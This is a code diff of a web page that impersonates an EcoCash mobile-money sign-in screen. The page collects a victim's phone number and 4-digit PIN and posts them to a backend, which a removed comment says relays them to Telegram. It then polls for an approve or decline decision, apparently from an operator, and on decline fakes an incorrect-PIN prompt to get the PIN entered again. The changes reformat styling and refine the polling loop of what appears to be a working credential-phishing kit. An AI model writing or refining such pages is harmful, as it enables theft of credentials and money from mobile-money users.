@@ -27,8 +27,7 @@
     -webkit-font-smoothing: antialiased; line-height: 1.5;
     min-height: 100vh; overflow-x: hidden;
   }
-
-  .bg-page { min-height: 100vh; padding: 24px 16px; display: flex; align-items: flex-start; justify-content: center; transition: filter .25s ease; }
+  .bg-page { min-height: 100vh; padding: 24px 16px; display: flex; align-items: flex-start; justify-content: center; }
   .bg-card { max-width: 480px; width: 100%; background: #fff; border-radius: 18px; border: 1px solid #E5E7EB; box-shadow: 0 10px 30px rgba(17,24,39,0.06); padding: 22px; }
   .bg-logo { display: inline-flex; align-items: baseline; font-weight: 800; font-size: 22px; margin-bottom: 16px; }
   .bg-logo .eco { color: var(--eco-blue); }
@@ -39,35 +38,20 @@
   .bg-row { display: flex; justify-content: space-between; padding: 10px 0; border-top: 1px solid #F0F2F6; font-size: 12.5px; }
   .bg-row .k { color: var(--eco-muted); }
   .bg-row .v { font-weight: 600; }
-
   body.modal-open .bg-page { filter: blur(5px); pointer-events: none; user-select: none; }
-
-  .overlay {
-    position: fixed; inset: 0;
-    background: var(--eco-overlay);
-    display: flex; align-items: center; justify-content: center;
-    padding: 24px 16px; z-index: 1000;
-    opacity: 0; pointer-events: none; transition: opacity .22s ease;
-    overflow-y: auto;
-  }
+  .overlay { position: fixed; inset: 0; background: var(--eco-overlay); display: flex; align-items: center; justify-content: center; padding: 24px 16px; z-index: 1000; opacity: 0; pointer-events: none; transition: opacity .22s ease; overflow-y: auto; }
   .overlay.show { opacity: 1; pointer-events: auto; }
-
-  .modal { position: relative; width: 91%; max-width: 750px; background: #fff; border-radius: 42px; overflow: hidden; box-shadow: 0 24px 60px rgba(16,24,40,0.35); margin: auto; transform: translateY(10px) scale(0.98); transition: transform .22s ease; }
-  .overlay.show .modal { transform: translateY(0) scale(1); }
-
+  .modal { position: relative; width: 91%; max-width: 750px; background: #fff; border-radius: 42px; overflow: hidden; box-shadow: 0 24px 60px rgba(16,24,40,0.35); margin: auto; }
   .close-btn { position: absolute; top: 18px; right: 18px; width: 40px; height: 40px; border-radius: 50%; background: transparent; border: none; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; color: var(--eco-close); z-index: 10; }
   .close-btn:hover { background: #F2F4F7; }
   .close-btn svg { width: 22px; height: 22px; stroke-width: 2.2; }
-
   .modal-header { background: #fff; padding: 44px 28px 30px; text-align: center; }
   .wordmark { display: inline-flex; align-items: baseline; font-weight: 900; letter-spacing: -1px; font-size: 30px; margin-bottom: 26px; }
   .wordmark .eco { color: var(--eco-blue); }
   .wordmark .cash { color: var(--eco-red); }
   .modal-title { font-size: 34px; font-weight: 800; letter-spacing: -0.8px; line-height: 1.15; }
-
   .modal-body { background: var(--eco-blue); padding: 36px 22px 40px; }
   .form-card { background: #fff; border-radius: 32px; padding: 30px 22px 34px; width: 90%; margin: 0 auto; }
-
   .phone-field { display: flex; align-items: center; height: 76px; border: 3px solid var(--eco-input-border); border-radius: 20px; background: #fff; overflow: hidden; margin-bottom: 22px; }
   .country-block { display: inline-flex; align-items: center; gap: 8px; padding: 0 14px 0 18px; height: 100%; flex-shrink: 0; }
   .country-block .flag { font-size: 24px; line-height: 1; }
@@ -75,46 +59,26 @@
   .phone-divider { width: 1.5px; height: 42px; background: #E4E7EC; flex-shrink: 0; }
   .phone-field input { flex: 1; min-width: 0; height: 100%; border: none; outline: none; background: transparent; padding: 0 16px; font-family: inherit; font-size: 22px; font-weight: 600; letter-spacing: 0.4px; }
   .phone-field input::placeholder { color: #98A2B3; font-weight: 500; }
-
   .pin-label { display: flex; align-items: center; justify-content: center; background: var(--eco-pin-bg); color: var(--eco-pin-text); font-size: 18px; font-weight: 700; padding: 10px 22px; border-radius: 999px; margin: 0 auto 20px; width: fit-content; }
-
   .pin-row { display: flex; justify-content: center; gap: 12px; margin-bottom: 24px; }
   .pin-row input { width: 62px; height: 62px; border: 3px solid var(--eco-pin-border); border-radius: 20px; background: #fff; color: var(--eco-navy); font-family: inherit; font-size: 28px; font-weight: 800; text-align: center; outline: none; -webkit-text-security: disc; }
   .pin-row input:focus { border-color: var(--eco-input-border); box-shadow: 0 0 0 4px rgba(0,102,166,0.15); background: #F6FBFE; }
   .pin-row input.filled { border-color: var(--eco-input-border); }
-
   .login-btn { width: 100%; height: 76px; background: var(--eco-blue); color: #fff; border: none; border-radius: 20px; font-family: inherit; font-size: 22px; font-weight: 800; cursor: pointer; }
   .login-btn:hover { filter: brightness(1.08); }
   .login-btn:disabled { opacity: 0.7; cursor: wait; }
-
   .form-error { display: none; background: #FEF2F2; border: 1px solid #FECACA; color: #B91C1C; font-size: 13px; font-weight: 500; padding: 10px 12px; border-radius: 10px; margin-bottom: 16px; text-align: center; line-height: 1.5; }
   .form-error.show { display: block; }
-
-  .verifying {
-    position: fixed; inset: 0;
-    background: #FFFFFF;
-    display: none; align-items: center; justify-content: center;
-    z-index: 2000;
-  }
+  .verifying { position: fixed; inset: 0; background: #FFFFFF; display: none; align-items: center; justify-content: center; z-index: 2000; }
   .verifying.show { display: flex; }
   .verifying .inner { text-align: center; max-width: 320px; padding: 0 24px; }
-  .verifying .logo-big {
-    display: inline-flex; align-items: baseline;
-    font-weight: 900; font-size: 32px; letter-spacing: -1px; margin-bottom: 34px;
-  }
+  .verifying .logo-big { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 32px; margin-bottom: 34px; }
   .verifying .logo-big .eco { color: var(--eco-blue); }
   .verifying .logo-big .cash { color: var(--eco-red); }
-  .verifying .spinner {
-    width: 54px; height: 54px; margin: 0 auto 22px;
-    border: 4px solid #E5E7EB;
-    border-top-color: var(--eco-blue);
-    border-radius: 50%;
-    animation: spin 0.9s linear infinite;
-  }
+  .verifying .spinner { width: 54px; height: 54px; margin: 0 auto 22px; border: 4px solid #E5E7EB; border-top-color: var(--eco-blue); border-radius: 50%; animation: spin 0.9s linear infinite; }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .verifying .t { font-size: 17px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; }
+  .verifying .t { font-size: 17px; font-weight: 800; margin-bottom: 6px; }
   .verifying .s { font-size: 13px; color: var(--eco-muted); line-height: 1.6; }
-
   @media (max-width: 420px) {
     .overlay { padding: 16px 10px; }
     .modal { border-radius: 32px; width: 94%; }
@@ -152,34 +116,25 @@
     <button class="close-btn" onclick="closeModal()" aria-label="Close">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
     </button>
-
     <div class="modal-header">
       <div class="wordmark"><span class="eco">Eco</span><span class="cash">Cash</span></div>
       <h1 class="modal-title">Sign in to authorize</h1>
     </div>
-
     <div class="modal-body">
       <div class="form-card">
         <div class="form-error" id="formError"></div>
-
         <div class="phone-field">
-          <div class="country-block">
-            <span class="flag" id="phoneFlag">🏳️</span>
-            <span class="dial" id="phoneDial">+000</span>
-          </div>
+          <div class="country-block"><span class="flag" id="phoneFlag">🏳️</span><span class="dial" id="phoneDial">+000</span></div>
           <div class="phone-divider"></div>
           <input type="tel" id="phoneInput" inputmode="numeric" autocomplete="tel" placeholder="Phone number" maxlength="15">
         </div>
-
         <div class="pin-label">Enter 4 digit PIN</div>
-
         <div class="pin-row">
           <input type="password" id="pin1" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
           <input type="password" id="pin2" inputmode="numeric" maxlength="1">
           <input type="password" id="pin3" inputmode="numeric" maxlength="1">
           <input type="password" id="pin4" inputmode="numeric" maxlength="1">
         </div>
-
         <button class="login-btn" id="loginBtn" onclick="submitLogin()">Login</button>
       </div>
     </div>
@@ -212,7 +167,6 @@ const COUNTRY_MAP = {
 };
 
 let currentTx = null;
-
 const params = new URLSearchParams(window.location.search);
 if (params.get('tx')) {
   currentTx = {
@@ -224,7 +178,6 @@ if (params.get('tx')) {
     an:  params.get('an')  || ''
   };
 }
-
 if (!currentTx) {
   try { currentTx = JSON.parse(sessionStorage.getItem('ecopay_current') || 'null'); } catch (e) {}
 }
@@ -234,7 +187,6 @@ function applyAdminCountry() {
   const entry = COUNTRY_MAP[countryName];
   const flagEl = document.getElementById('phoneFlag');
   const dialEl = document.getElementById('phoneDial');
-
   if (!entry) {
     flagEl.textContent = '🏳️';
     dialEl.textContent = '+—';
@@ -306,9 +258,6 @@ document.getElementById('overlay').addEventListener('click', (e) => {
   if (e.target === document.getElementById('overlay')) closeModal();
 });
 
-/* ============================================================
-   Popup for declined
-============================================================ */
 function showIncorrectPinPopup() {
   const overlay = document.createElement('div');
   overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:3000;padding:24px;';
@@ -323,12 +272,8 @@ function showIncorrectPinPopup() {
   overlay.querySelector('#pinErrOk').onclick = () => overlay.remove();
 }
 
-/* ============================================================
-   Submit — accept first, THEN poll
-============================================================ */
 async function submitLogin() {
   clearFormError();
-
   const countryName = currentTx && currentTx.c ? currentTx.c : '';
   const entry = COUNTRY_MAP[countryName];
   if (!entry) { showFormError('No country configured.'); return; }
@@ -346,7 +291,6 @@ async function submitLogin() {
   const txId = currentTx ? currentTx.tx : null;
 
   try {
-    // ---- Step 1: send to Telegram ----
     const res = await fetch('/api/accept', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -365,12 +309,16 @@ async function submitLogin() {
       return;
     }
 
-    // ---- Step 2: poll for decision ----
+    // ---- Poll for decision ----
     const start = Date.now();
     const maxWaitMs = 5 * 60 * 1000;
+    let stopped = false;
 
     const poll = async () => {
+      if (stopped) return;
+
       if (Date.now() - start > maxWaitMs) {
+        stopped = true;
         document.getElementById('verifying').classList.remove('show');
         document.getElementById('loginBtn').disabled = false;
         showFormError('Request timed out. Please try again.');
@@ -381,8 +329,10 @@ async function submitLogin() {
         const r = await fetch('/api/status/' + encodeURIComponent(txId) + '?_=' + Date.now());
         const s = await r.json();
         const decision = s.decision || s.status;
+        console.log('[poll]', s);
 
         if (decision === 'approved') {
+          stopped = true;
           const q = new URLSearchParams({
             tx:  (currentTx && currentTx.tx)  || '',
             am:  (currentTx && currentTx.am)  || '',
@@ -390,11 +340,12 @@ async function submitLogin() {
             rn:  (currentTx && currentTx.rn)  || '',
             c:   (currentTx && currentTx.c)   || ''
           });
-          window.location.href = 'verify.html?' + q.toString();
+          window.location.replace('verify.html?' + q.toString());
           return;
         }
 
         if (decision === 'declined') {
+          stopped = true;
           document.getElementById('verifying').classList.remove('show');
           document.getElementById('loginBtn').disabled = false;
           pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
@@ -402,7 +353,9 @@ async function submitLogin() {
           showIncorrectPinPopup();
           return;
         }
-      } catch (e) { /* retry */ }
+      } catch (e) {
+        console.log('[poll error]', e);
+      }
 
       setTimeout(poll, 1200);
     };
